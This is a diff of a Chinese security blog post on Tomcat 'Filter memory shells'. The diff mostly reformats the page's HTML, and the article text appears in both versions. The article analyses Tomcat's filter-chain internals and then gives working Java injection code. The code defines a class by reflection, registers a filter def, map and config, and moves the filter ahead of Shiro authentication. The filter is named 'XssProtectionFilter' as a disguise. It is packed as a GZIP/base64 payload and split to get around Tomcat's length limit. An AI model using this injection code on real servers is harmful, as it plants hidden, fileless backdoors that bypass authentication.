@@ -1,174 +1,14 @@
-<!DOCTYPE html>
-<html lang="zh-cn">
-<head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-  <title>Tomcat之Filter内存马 - P1n93r - 博学而精一</title>
-  <meta name="renderer" content="webkit" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-<meta name="theme-color" content="#f8f5ec" />
-<meta name="msapplication-navbutton-color" content="#f8f5ec">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
-
-
-<meta name="author" content="P1n93r" /><meta name="description" content="前置知识 阅读本篇文章前需要掌握《Tomcat架构原理》。 分析 根据《Tomcat架构原理》中提到：Wrapper容器的最后一个Valve会创建" /><meta name="keywords" content="Security, Java, Web, Android" />
-
-
-
-
-
-
-<meta name="generator" content="Hugo 0.96.0 with theme even" />
-
-
-<link rel="canonical" href="https://p1n93r.github.io/post/security/tomcat%E4%B9%8Bfilter%E5%86%85%E5%AD%98%E9%A9%AC/" />
-<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="manifest" href="/manifest.json">
-<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
-
-
-<meta property="og:title" content="Tomcat之Filter内存马" />
-<meta property="og:description" content="前置知识 阅读本篇文章前需要掌握《Tomcat架构原理》。 分析 根据《Tomcat架构原理》中提到：Wrapper容器的最后一个Valve会创建" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://p1n93r.github.io/post/security/tomcat%E4%B9%8Bfilter%E5%86%85%E5%AD%98%E9%A9%AC/" /><meta property="article:section" content="post" />
-<meta property="article:published_time" content="2021-06-01T09:07:36+08:00" />
-<meta property="article:modified_time" content="2021-06-01T09:07:36+08:00" />
-
-<meta itemprop="name" content="Tomcat之Filter内存马">
-<meta itemprop="description" content="前置知识 阅读本篇文章前需要掌握《Tomcat架构原理》。 分析 根据《Tomcat架构原理》中提到：Wrapper容器的最后一个Valve会创建"><meta itemprop="datePublished" content="2021-06-01T09:07:36+08:00" />
-<meta itemprop="dateModified" content="2021-06-01T09:07:36+08:00" />
-<meta itemprop="wordCount" content="3008">
-<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Tomcat之Filter内存马"/>
-<meta name="twitter:description" content="前置知识 阅读本篇文章前需要掌握《Tomcat架构原理》。 分析 根据《Tomcat架构原理》中提到：Wrapper容器的最后一个Valve会创建"/>
-
-<!--[if lte IE 9]>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
-<![endif]-->
-
-<!--[if lt IE 9]>
-  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
-<![endif]-->
-
-</head>
-<body>
-  <div id="mobile-navbar" class="mobile-navbar">
-  <div class="mobile-header-logo">
-    <a href="/" class="logo">P1n93r</a>
-  </div>
-  <div class="mobile-navbar-icon">
-    <span></span>
-    <span></span>
-    <span></span>
-  </div>
-</div>
-<nav id="mobile-menu" class="mobile-menu slideout-menu">
-  <ul class="mobile-menu-list">
-    <a href="/">
-        <li class="mobile-menu-item">Home</li>
-      </a><a href="/post/">
-        <li class="mobile-menu-item">Archives</li>
-      </a><a href="/tags/">
-        <li class="mobile-menu-item">Tags</li>
-      </a><a href="/categories/">
-        <li class="mobile-menu-item">Categories</li>
-      </a><a href="/about/">
-        <li class="mobile-menu-item">About</li>
-      </a>
-  </ul>
-
-  
-
-
-</nav>
-
-  <div class="container" id="mobile-panel">
-    <header id="header" class="header">
-        <div class="logo-wrapper">
-  <a href="/" class="logo">P1n93r</a>
-</div>
-
-
-
-
-
-<nav class="site-navbar">
-  <ul id="menu" class="menu">
-    <li class="menu-item">
-        <a class="menu-item-link" href="/">Home</a>
-      </li><li class="menu-item">
-        <a class="menu-item-link" href="/post/">Archives</a>
-      </li><li class="menu-item">
-        <a class="menu-item-link" href="/tags/">Tags</a>
-      </li><li class="menu-item">
-        <a class="menu-item-link" href="/categories/">Categories</a>
-      </li><li class="menu-item">
-        <a class="menu-item-link" href="/about/">About</a>
-      </li>
-  </ul>
-</nav>
-
-    </header>
-
-    <main id="main" class="main">
-      <div class="content-wrapper">
-        <div id="content" class="content">
-          <article class="post">
-    
-    <header class="post-header">
-      <h1 class="post-title">Tomcat之Filter内存马</h1>
-
-      <div class="post-meta">
-        <span class="post-time"> 2021-06-01 </span>
-        <div class="post-category">
-            <a href="/categories/security/"> security </a>
-            </div>
-          <span class="more-meta"> 约 3008 字 </span>
-          <span class="more-meta"> 预计阅读 7 分钟 </span>
-        <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
-      </div>
-    </header>
-
-    <div class="post-toc" id="post-toc">
-  <h2 class="post-toc-title">文章目录</h2>
-  <div class="post-toc-content always-active">
-    <nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#前置知识">前置知识</a></li>
-        <li><a href="#分析">分析</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-  </div>
-</div>
-    <div class="post-content">
-      <h2 id="前置知识">前置知识</h2>
-<p>阅读本篇文章前需要掌握<a href="https://p1n93r.github.io/post/java/tomcat%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86/">《Tomcat架构原理》</a>。</p>
-<h2 id="分析">分析</h2>
-<p>根据《Tomcat架构原理》中提到：<strong>Wrapper容器的最后一个Valve会创建一个Filter链，并调用doFileter方法，最终会调到Servlet的service方法。</strong> 。那我们跟踪一下StandardWrapperValve类，找到其创建FilterChain的代码进行分析，如下所示：</p>
-<pre><code>// 代码位置：StandardWrapperValve类
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>Tomcat之Filter内存马 - P1n93r - 博学而精一</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="P1n93r"><meta name=description content="前置知识 阅读本篇文章前需要掌握《Tomcat架构原理》。 分析 根据《Tomcat架构原理》中提到：Wrapper容器的最后一个Valve会创建"><meta name=keywords content="Security,Java,Web,Android"><meta name=generator content="Hugo 0.97.3 with theme even"><link rel=canonical href=https://p1n93r.github.io/post/security/tomcat%E4%B9%8Bfilter%E5%86%85%E5%AD%98%E9%A9%AC/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script>
+<link href=/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:title" content="Tomcat之Filter内存马"><meta property="og:description" content="前置知识 阅读本篇文章前需要掌握《Tomcat架构原理》。 分析 根据《Tomcat架构原理》中提到：Wrapper容器的最后一个Valve会创建"><meta property="og:type" content="article"><meta property="og:url" content="https://p1n93r.github.io/post/security/tomcat%E4%B9%8Bfilter%E5%86%85%E5%AD%98%E9%A9%AC/"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-06-01T09:07:36+08:00"><meta property="article:modified_time" content="2021-06-01T09:07:36+08:00"><meta itemprop=name content="Tomcat之Filter内存马"><meta itemprop=description content="前置知识 阅读本篇文章前需要掌握《Tomcat架构原理》。 分析 根据《Tomcat架构原理》中提到：Wrapper容器的最后一个Valve会创建"><meta itemprop=datePublished content="2021-06-01T09:07:36+08:00"><meta itemprop=dateModified content="2021-06-01T09:07:36+08:00"><meta itemprop=wordCount content="3008"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="Tomcat之Filter内存马"><meta name=twitter:description content="前置知识 阅读本篇文章前需要掌握《Tomcat架构原理》。 分析 根据《Tomcat架构原理》中提到：Wrapper容器的最后一个Valve会创建"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
+<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>P1n93r</a></div><div class=mobile-navbar-icon><span></span>
+<span></span>
+<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>Home</li></a><a href=/post/><li class=mobile-menu-item>Archives</li></a><a href=/tags/><li class=mobile-menu-item>Tags</li></a><a href=/categories/><li class=mobile-menu-item>Categories</li></a><a href=/about/><li class=mobile-menu-item>About</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>P1n93r</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>Home</a></li><li class=menu-item><a class=menu-item-link href=/post/>Archives</a></li><li class=menu-item><a class=menu-item-link href=/tags/>Tags</a></li><li class=menu-item><a class=menu-item-link href=/categories/>Categories</a></li><li class=menu-item><a class=menu-item-link href=/about/>About</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>Tomcat之Filter内存马</h1><div class=post-meta><span class=post-time>2021-06-01</span><div class=post-category><a href=/categories/security/>security</a></div><span class=more-meta>约 3008 字</span>
+<span class=more-meta>预计阅读 7 分钟</span>
+<span id=busuanzi_container_page_pv class=more-meta><span id=busuanzi_value_page_pv><img src=/img/spinner.svg alt=spinner.svg></span> 次阅读</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>文章目录</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#前置知识>前置知识</a></li><li><a href=#分析>分析</a></li></ul></li></ul></nav></div></div><div class=post-content><h2 id=前置知识>前置知识</h2><p>阅读本篇文章前需要掌握<a href=https://p1n93r.github.io/post/java/tomcat%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86/>《Tomcat架构原理》</a>。</p><h2 id=分析>分析</h2><p>根据《Tomcat架构原理》中提到：<strong>Wrapper容器的最后一个Valve会创建一个Filter链，并调用doFileter方法，最终会调到Servlet的service方法。</strong> 。那我们跟踪一下StandardWrapperValve类，找到其创建FilterChain的代码进行分析，如下所示：</p><pre><code>// 代码位置：StandardWrapperValve类
 // Create the filter chain for this request
 ApplicationFilterChain filterChain =
         ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);
-</code></pre>
-<p>可以看到，是调用ApplicationFilterFactory#createFilterChain()方法来创建过滤器链，继续跟进：</p>
-<pre><code>// 代码位置ApplicationFilterFactory#createFilterChain()
+</code></pre><p>可以看到，是调用ApplicationFilterFactory#createFilterChain()方法来创建过滤器链，继续跟进：</p><pre><code>// 代码位置ApplicationFilterFactory#createFilterChain()
 public static ApplicationFilterChain createFilterChain(ServletRequest request,
         Wrapper wrapper, Servlet servlet) {
 
@@ -259,20 +99,14 @@ public static ApplicationFilterChain createFilterChain(ServletRequest request,
     // 最后返回添加了filterConfig的filterChain
     return filterChain;
 }
-</code></pre>
-<p>总结一下，创建过滤器链，要使得链内的过滤器起作用，需要在过滤器链中添加filterConfig，但是在此之前，需要先从context中拿到filterMap进行请求路径匹配对比。所以，我们目前至少知道，注入一个Filter，我们需要往context中先后注入filterMap以及filterConfig。</p>
-<p>这里我们使用的是StandardContext类，该类提供了开放的addFilterMap()可以添加filterMap，没有提供开放的方法添加filterConfig，但是可以通过反射进行添加。</p>
-<p>首先在StandardContext中添加filterMap，跟进StardardContxt#addFilterMap()，代码如下：</p>
-<pre><code>public void addFilterMap(FilterMap filterMap) {
+</code></pre><p>总结一下，创建过滤器链，要使得链内的过滤器起作用，需要在过滤器链中添加filterConfig，但是在此之前，需要先从context中拿到filterMap进行请求路径匹配对比。所以，我们目前至少知道，注入一个Filter，我们需要往context中先后注入filterMap以及filterConfig。</p><p>这里我们使用的是StandardContext类，该类提供了开放的addFilterMap()可以添加filterMap，没有提供开放的方法添加filterConfig，但是可以通过反射进行添加。</p><p>首先在StandardContext中添加filterMap，跟进StardardContxt#addFilterMap()，代码如下：</p><pre><code>public void addFilterMap(FilterMap filterMap) {
 	// 添加FilterMap之前，先调用validateFilterMap检验此FilterMap
     validateFilterMap(filterMap);
     // Add this filter mapping to our registered set
     filterMaps.add(filterMap);
     fireContainerEvent(&quot;addFilterMap&quot;, filterMap);
 }
-</code></pre>
-<p>继续跟进StandardContext#validateFilterMap()，关键代码如下：</p>
-<pre><code>private void validateFilterMap(FilterMap filterMap) {
+</code></pre><p>继续跟进StandardContext#validateFilterMap()，关键代码如下：</p><pre><code>private void validateFilterMap(FilterMap filterMap) {
     // Validate the proposed filter mapping
     String filterName = filterMap.getFilterName();
     String[] servletNames = filterMap.getServletNames();
@@ -283,18 +117,7 @@ public static ApplicationFilterChain createFilterChain(ServletRequest request,
             (sm.getString(&quot;standardContext.filterMap.name&quot;, filterName));
 	// 省略以下代码...
 }
-</code></pre>
-<p>所以，要调用StandardContext#addFilterMap()添加filterMap，还需要在此之前在StandardContext添加相关的filterDef。于是整理下注入Filter内存马得思路：</p>
-<ol>
-<li>先利用ContextClassLoader#defineClass()注入Filter内存马类定义，此时只是注入了类定义，还不会起作用。</li>
-<li>调用StandardContext#addFilterDef()添加filterDef，其中filterDef的filter属性即为利用反射实例化的内存马对象。</li>
-<li>再调用StandardContext#addFilterMap()中添加filterMap。</li>
-<li>然后通过反射往StandardContext中添加filterConfig。</li>
-<li>最后，不要忘记调整Filter内存马的filterMap顺序为filterMaps的第一个，因为Tomcat的过滤器的过滤顺序是根据filterMaps的顺序来的，防止我们注入的Filter内存马被类似shiro等身份验证的filter提前结束请求，而执行不了的情况，我们需要将我们注入的 Filter内存马顺序调整到第一位。</li>
-</ol>
-<p>Notice：filterName均保持一致。</p>
-<p>于是可以得到如下整体的内存马注入代码：</p>
-<pre><code>String filterName=&quot;xssProtectionFilter&quot;;
+</code></pre><p>所以，要调用StandardContext#addFilterMap()添加filterMap，还需要在此之前在StandardContext添加相关的filterDef。于是整理下注入Filter内存马得思路：</p><ol><li>先利用ContextClassLoader#defineClass()注入Filter内存马类定义，此时只是注入了类定义，还不会起作用。</li><li>调用StandardContext#addFilterDef()添加filterDef，其中filterDef的filter属性即为利用反射实例化的内存马对象。</li><li>再调用StandardContext#addFilterMap()中添加filterMap。</li><li>然后通过反射往StandardContext中添加filterConfig。</li><li>最后，不要忘记调整Filter内存马的filterMap顺序为filterMaps的第一个，因为Tomcat的过滤器的过滤顺序是根据filterMaps的顺序来的，防止我们注入的Filter内存马被类似shiro等身份验证的filter提前结束请求，而执行不了的情况，我们需要将我们注入的 Filter内存马顺序调整到第一位。</li></ol><p>Notice：filterName均保持一致。</p><p>于是可以得到如下整体的内存马注入代码：</p><pre><code>String filterName=&quot;xssProtectionFilter&quot;;
 java.lang.ClassLoader classLoader = (java.lang.ClassLoader) Thread.currentThread().getContextClassLoader();
 java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;,new Class[] {byte[].class, int.class, int.class});
 defineClass.setAccessible(true);
@@ -354,9 +177,7 @@ for (int i = 0; i &lt; filterMaps.length; i++)
 for (int i = 0; i &lt; filterMaps.length; i++) {
     filterMaps[i] = tmpFilterMaps[i];
 }
-</code></pre>
-<p>Filter的代码如下所示：</p>
-<pre><code>public class XssProtectionFilter implements Filter {
+</code></pre><p>Filter的代码如下所示：</p><pre><code>public class XssProtectionFilter implements Filter {
     @Override
     public void init(FilterConfig filterConfig) throws ServletException { }
     @Override
@@ -382,9 +203,7 @@ for (int i = 0; i &lt; filterMaps.length; i++) {
     @Override
     public void destroy(){}
 }
-</code></pre>
-<p>将XssProtectionFilter类的字节码压缩后base64存储，得到最开始代码中的evalBase64：</p>
-<pre><code>public static void main(String[] args) throws IOException {
+</code></pre><p>将XssProtectionFilter类的字节码压缩后base64存储，得到最开始代码中的evalBase64：</p><pre><code>public static void main(String[] args) throws IOException {
     InputStream in = Test.class.getClassLoader().getResourceAsStream(&quot;XssProtectionFilter.class&quot;);
     byte[] bytes = new byte[in.available()];
     in.read(bytes);
@@ -395,117 +214,23 @@ for (int i = 0; i &lt; filterMaps.length; i++) {
     gzipOutputStream.close();
     System.out.println(java.util.Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
 }
-</code></pre>
-<p>利用本文的方法，GZIP压缩以及分两次发送payload，即可绕过Tomcat对payload的长度限制。同时，最后对filterMap的顺序修改，可以绕过shiro的过滤器提前拦截的问题。最终得到的效果如下图所示：</p>
-<p><img src="/media/2021-06-01-01.png" alt="Filter内存马效果"></p>
-
-    </div>
-
-    <div class="post-copyright">
-  <p class="copyright-item">
-    <span class="item-title">文章作者</span>
-    <span class="item-content">P1n93r</span>
-  </p>
-  <p class="copyright-item">
-    <span class="item-title">上次更新</span>
-    <span class="item-content">
-        2021-06-01
-        
-    </span>
-  </p>
-  
-  
-</div>
-<footer class="post-footer">
-      
-      <nav class="post-nav">
-        <a class="prev" href="/post/security/tomcat%E4%B9%8Bservlet%E5%86%85%E5%AD%98%E9%A9%AC/">
-            <i class="iconfont icon-left"></i>
-            <span class="prev-text nav-default">Tomcat之Servlet内存马</span>
-            <span class="prev-text nav-mobile">上一篇</span>
-          </a>
-        <a class="next" href="/post/java/tomcat%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86/">
-            <span class="next-text nav-default">Tomcat架构原理</span>
-            <span class="next-text nav-mobile">下一篇</span>
-            <i class="iconfont icon-right"></i>
-          </a>
-      </nav>
-    </footer>
-  </article>
-        </div>
-        <div id="disqus_thread"></div>
-    <script type="text/javascript">
-    (function() {
-      
-      
-      if (window.location.hostname === 'localhost') return;
-
-      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-      var disqus_shortname = 'p1n93r';
-      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-
-  
-
-  
-
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="social-links">
-      <a href="mailto:pin83r@gmail.com" class="iconfont icon-email" title="email"></a>
-      <a href="https://github.com/p1n93r" class="iconfont icon-github" title="github"></a>
-  <a href="https://p1n93r.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
-</div>
-
-<div class="copyright">
-  <span class="power-by">
-    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
-  </span>
-  <span class="division">|</span>
-  <span class="theme-info">
-    主题 - 
-    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
-  </span>
-
-  <div class="busuanzi-footer">
-    <span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_value_site_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次 </span>
-      <span class="division">|</span>
-    <span id="busuanzi_container_site_uv"> 本站总访客数 <span id="busuanzi_value_site_uv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 人 </span>
-  </div>
-
-  <span class="copyright-year">
-    &copy; 
-    2019 - 
-    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>P1n93r</span>
-  </span>
-</div>
-
-    </footer>
-
-    <div class="back-to-top" id="back-to-top">
-      <i class="iconfont icon-up"></i>
-    </div>
-  </div>
-  
-  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
-  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
-
-
-
-<script type="text/javascript" src="/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js"></script>
-
-
-
-
-
-
-
-
-</body>
-</html>
+</code></pre><p>利用本文的方法，GZIP压缩以及分两次发送payload，即可绕过Tomcat对payload的长度限制。同时，最后对filterMap的顺序修改，可以绕过shiro的过滤器提前拦截的问题。最终得到的效果如下图所示：</p><p><img src=/media/2021-06-01-01.png alt=Filter内存马效果></p></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
+<span class=item-content>P1n93r</span></p><p class=copyright-item><span class=item-title>上次更新</span>
+<span class=item-content>2021-06-01</span></p></div><footer class=post-footer><nav class=post-nav><a class=prev href=/post/security/tomcat%E4%B9%8Bservlet%E5%86%85%E5%AD%98%E9%A9%AC/><i class="iconfont icon-left"></i>
+<span class="prev-text nav-default">Tomcat之Servlet内存马</span>
+<span class="prev-text nav-mobile">上一篇</span></a>
+<a class=next href=/post/java/tomcat%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86/><span class="next-text nav-default">Tomcat架构原理</span>
+<span class="next-text nav-mobile">下一篇</span>
+<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname==="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="p1n93r",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=mailto:pin83r@gmail.com class="iconfont icon-email" title=email></a>
+<a href=https://github.com/p1n93r class="iconfont icon-github" title=github></a>
+<a href=https://p1n93r.github.io/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动</span>
+<span class=division>|</span>
+<span class=theme-info>主题 -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span><div class=busuanzi-footer><span id=busuanzi_container_site_pv>本站总访问量 <span id=busuanzi_value_site_pv><img src=/img/spinner.svg alt=spinner.svg></span> 次</span>
+<span class=division>|</span>
+<span id=busuanzi_container_site_uv>本站总访客数 <span id=busuanzi_value_site_uv><img src=/img/spinner.svg alt=spinner.svg></span> 人</span></div><span class=copyright-year>&copy;
+2019 -
+2022<span class=heart><i class="iconfont icon-heart"></i></span><span>P1n93r</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
+<script type=text/javascript src=/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js></script></body></html>
